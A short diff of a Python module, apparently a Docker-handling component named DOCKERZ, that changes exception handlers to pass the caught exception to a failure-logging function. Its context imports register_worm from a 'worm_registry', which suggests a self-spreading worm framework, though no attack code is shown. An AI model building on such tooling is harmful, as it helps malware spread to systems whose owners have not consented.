@@ -42,8 +42,8 @@ except ImportError:                               # never break the host
 try:
     from CORE.worm_registry import register_worm
     _REGISTRY = True
-except ImportError:
-    note_failure("DOCKERZ:L36", None)
+except ImportError as exc:
+    note_failure("DOCKERZ:L36", exc)
     _REGISTRY = False
     def register_worm(**kw):
         return lambda cls: cls
@@ -120,11 +120,11 @@ class DOCKERZ:
                 timeout=timeout,
             )
             return result.returncode == 0, result.stdout, result.stderr
-        except subprocess.TimeoutExpired:
-            note_failure("DOCKERZ:L112", None)
+        except subprocess.TimeoutExpired as exc:
+            note_failure("DOCKERZ:L112", exc)
             return False, "", "Command timed out"
-        except FileNotFoundError:
-            note_failure("DOCKERZ:L114", None)
+        except FileNotFoundError as exc:
+            note_failure("DOCKERZ:L114", exc)
             return False, "", "Docker not found"
         except Exception as e:
             note_failure("DOCKERZ:L116", e)
